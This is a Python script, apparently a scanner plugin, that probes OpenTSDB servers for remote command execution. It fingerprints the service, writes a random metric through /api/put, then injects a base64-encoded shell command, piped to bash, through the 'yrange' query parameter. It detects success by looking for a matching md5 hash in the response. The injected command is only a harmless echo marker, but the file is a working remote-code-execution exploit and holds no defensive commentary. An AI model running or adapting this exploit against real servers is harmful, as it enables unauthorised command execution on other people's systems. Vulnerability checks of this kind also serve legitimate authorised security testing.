import requests,re,urllib3,time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r1=randomLowercase(3)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r2=randomLowercase(3)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r3=randomLowercase(3)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r4=randomInt(1024, 65535)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"s/opentsdb_header.jpg"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if len(reditList)>0:
		f_list=[]
		for response in reditList:
			if response.status_code == 200 and "text/plain" in response.headers["Content-Type"] and "\xff\xd8\xff\xe1" in response.text:
				f_list.append(1)
		if len(f_list)==1:
			r0=True
		else:
			r0=False
	else:
		if response.status_code == 200 and "text/plain" in response.headers["Content-Type"] and "\xff\xd8\xff\xe1" in response.text:
			r0=True
		else:
			r0=False
	url=baseurl+"api/put"
	body='''[\r
    {\r
        "metric": "'''+r1+'''.'''+r2+'''.'''+r3+'''",\r
        "timestamp": 1608700420,\r
        "value": '''+str(r4)+''',\r
        "tags": {\r
           "host": "web01",\r
           "dc": "lga"\r
        }\r
    },\r
    {\r
        "metric": "'''+r1+'''.'''+r2+'''.'''+r3+'''",\r
        "timestamp": 1608700421,\r
        "value": '''+str(r4)+''',\r
        "tags": {\r
           "host": "web02",\r
           "dc": "lga"\r
        }\r
    }\r
]\r'''
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	reditList = response.history
	time.sleep(5)
	if len(reditList)>0:
		f_list=[]
		for response in reditList:
			if response.status_code == 204 and "json" in response.headers["Content-Type"]:
				f_list.append(1)
		if len(f_list)==1:
			r11=True
		else:
			r11=False
	else:
		if response.status_code == 204 and "json" in response.headers["Content-Type"]:
			r11=True
		else:
			r11=False
	url=baseurl+'q?start=2000/10/21-00:00:00&end=2020/12/25-00:00:00&m=sum:'+r1+'.'+r2+'.'+r3+'&o=&yrange=[0:system(\'echo%20-e%20"ZWNobyAxMjMgfG1kNXN1bSAxPiYyCg=="%20|%20base64%20-d%20|bash\')]&wxh=1698x316&style=linespoint&json'
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if len(reditList)>0:
		f_list=[]
		for response in reditList:
			if response.status_code == 400 and "json" in response.headers["Content-Type"] and "ba1f2511fc30423bdbb183fe33f3dd0f" in response.text:
				f_list.append(1)
		if len(f_list)==1:
			r22=True
		else:
			r22=False
	else:
		if response.status_code == 400 and "json" in response.headers["Content-Type"] and "ba1f2511fc30423bdbb183fe33f3dd0f" in response.text:
			r22=True
		else:
			r22=False
	if r0 and r11 and r22:
		return True
	else:
		return False
